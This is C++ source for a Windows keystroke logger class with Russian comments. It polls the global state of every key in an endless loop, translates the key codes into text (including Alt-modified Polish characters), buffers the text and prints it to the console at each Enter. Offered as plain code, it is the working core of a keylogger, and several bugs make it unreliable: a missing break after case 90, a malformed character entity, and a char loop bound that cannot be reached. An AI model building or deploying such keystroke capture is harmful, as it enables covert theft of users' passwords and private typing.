#include "Logger.h"

Logger* Logger::instance = NULL;
LANGID Logger::langId = 9;
map <int, vector<char>> btnKeyRu = {};
map <int, vector<char>> btnKeyEn = {};

Logger::Logger() {
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        is_capslock = true;
    }
}
void Logger::put(char simbol)
{
	instance->simbols += simbol;
}
string Logger::get() {
	return instance->simbols;
}
Logger* Logger::getInstance()
{
	if (instance == NULL) {
		instance = new Logger();
	}
	return instance;
}

int Logger::saveEng(int key)
{
    switch (key) {
    case 96:
        instance->simbols += "0";
        break;
    case 97:
        instance->simbols += "1";
        break;
    case 98:
        
        instance->simbols += "2";
        break;
    case 99:
        
        instance->simbols += "3";
        break;
    case 100:
        
        instance->simbols += "4";
        break;
    case 101:
        
        instance->simbols += "5";
        break;
    case 102:
        
        instance->simbols += "6";
        break;
    case 103:
        
        instance->simbols += "7";
        break;
    case 104:
        
        instance->simbols += "8";
        break;
    case 105:
        
        instance->simbols += "9";
        break;
        // Конец. Цифровая клавиатура

        //Начало. Клавиатура вверху.
    case 48:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += ")";
        }
        else
            instance->simbols += "0";
        break;
    case 49:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "!";
        }
        else
            instance->simbols += "1";
        break;
    case 50:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "@";
        }
        else
            instance->simbols += "2";
        break;
    case 51:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "#";
        }
        else
            instance->simbols += "3";
        break;
    case 52:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "$";
        }
        else
            instance->simbols += "4";
        break;
    case 53:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "%";
        }
        else
            instance->simbols += "5";
        break;
    case 54:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "^";
        }
        else
            instance->simbols += "6";
        break;
    case 55:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "&";
        }
        else
            instance->simbols += "7";
        break;
    case 56:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "*";
        }
        else
            instance->simbols += "8";
        break;
    case 57:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "(";
        }
        else
            instance->simbols += "9";
        break;
        //Конец. Клавиатура вверху

        //Начало. Ввод набора букв с клавиатуры.
        //Используем таблицу символов Юников (Unicode)
        //Например, код &#260 соответствует латинской заглавной букве А
    case 65:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT) || (is_capslock && !GetAsyncKeyState(VK_LSHIFT) || is_capslock && GetAsyncKeyState(VK_RSHIFT))) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#260";
            }
            else
                instance->simbols += "A";
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#261";
            }
            else
                instance->simbols += "a";
        }
        break;
    case 66:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "B";
        }
        else
            instance->simbols += "b";
        break;
    case 67:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#262";
            }
            else {
                instance->simbols += "C";
            }
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#263";
            }
            else {
                instance->simbols += "c";
            }
        }
        break;
    case 68:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "D";
        }
        else
            instance->simbols += "d";
        break;
    case 69:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#280";
            }
            else {
                instance->simbols += "E";
            }
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#281";
            }
            else {
                instance->simbols += "e";
            }
        }
        break;
    case 70:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "F";
        }
        else
            instance->simbols += "f";
        break;
    case 71:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "G";
        }
        else
            instance->simbols += "g";
        break;
    case 72:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "H";
        }
        else
            instance->simbols += "h";
        break;
    case 73:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "I";
        }
        else
            instance->simbols += "i";
        break;
    case 74:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "J";
        }
        else
            instance->simbols += "j";
        break;
    case 75:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "K";
        }
        else
            instance->simbols += "k";
        break;
    case 76:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#321";
            }
            else {
                instance->simbols += "L";
            }
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&322";
            }
            else {
                instance->simbols += "l";
            }
        }
        break;
    case 77:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "M";
        }
        else
            instance->simbols += "m";
        break;
    case 78:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#323";
            }
            else {
                instance->simbols += "N";
            }
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#324";
            }
            else {
                instance->simbols += "n";
            }
        }
        break;
    case 79:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#211";
            }
            else {
                instance->simbols += "O";
            }
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#243";
            }
            else {
                instance->simbols += "o";
            }
        }
        break;
    case 80:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "P";
            break;
        }
        else
            instance->simbols += "p";
        break;
    case 81:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
        {
            instance->simbols += "Q";
            break;
        }
        else
            instance->simbols += "q";

        break;

    case 82:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "R";
            break;
        }
        else
            instance->simbols += "r";
        break;
    case 83:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#346";
            }
            else {
                instance->simbols += "S";
            }
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#347";
            }
            else {
                instance->simbols += "s";
            }
        }
        break;
    case 84:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "T";
            break;
        }
        else
            instance->simbols += "t";
        break;
    case 85:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "U";
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "ˆ";
            }
            else {
                instance->simbols += "u";
            }
        }
        break;
    case 86:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "V";
            break;
        }
        else
            instance->simbols += "v";
        break;
    case 87:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "W";
            break;
        }
        else
            instance->simbols += "w";
        break;
    case 88:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#377";
            }
            else {
                instance->simbols += "X";
            }
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#378";
            }
            else {
                instance->simbols += "x";
            }
        }
        break;
    case 89:
        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            instance->simbols += "Y";
            break;
        }
        else
            instance->simbols += "y";
        break;
    case 90:

        
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#379";
            }
            else {
                instance->simbols += "Z";
            }
            break;
        }
        else {
            if (GetAsyncKeyState(VK_MENU)) {
                instance->simbols += "&#380";
            }
            else {
                instance->simbols += "z";
            }
        }

        //Начало. Ввод набора букв с клавиатуры.
        //Десятичные коды клавиш.
    case 13:
        cout << this->get() << endl;
        instance->simbols = "";
        break;
    case 20:
        
        if (is_capslock == false) {
            is_capslock = true;
        }
        else {
            is_capslock = false;
        }
        // TODO доработать логику капслока
        break;
    case VK_BACK:
        instance->simbols = simbols.substr(0, simbols.length() - 1);
        break;
    case VK_SPACE:
        
        instance->simbols += " ";
        break;
    case VK_MULTIPLY:
        
        instance->simbols += "*";
        break;
    case VK_ADD:
        
        instance->simbols += "+";
        break;
    case VK_SUBTRACT:
        
        instance->simbols += "-";
        break;
    case VK_DECIMAL:
        
        instance->simbols += ".";
        break;
    case VK_DIVIDE:
        
        instance->simbols += "/";
        break;
    default:
        break;
    }
    return 0;
}

void Logger::run()
{
    HKL lang = GetKeyboardLayout(0);
    Logger* log = Logger::getInstance();
    langId = PRIMARYLANGID(lang); // 9 - en 25 - ru;
    char i;
    while (1) {
        /*if ((GetAsyncKeyState(VK_RETURN) & 0x01) != 0) {
            break;
        }*/
        // if (GetKeyboardLayout(0) == WM_INPUTLANGCHANGE) 
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                log->saveEng(i);
            }
        }

    }
}


void Logger::fillBtnKey() {
    map<char, char> enToRu = { {'q', 'й'}, {'w', 'ц'}};
    for (int i = 32; i <= 125; i++) {
        btnKeyEn.insert({{i, {char(i)}}});
        //Logger::btnKeyRu.insert(pair<int, vector<char>>(i, { enToRu.at(char(i)) }));
    }
}

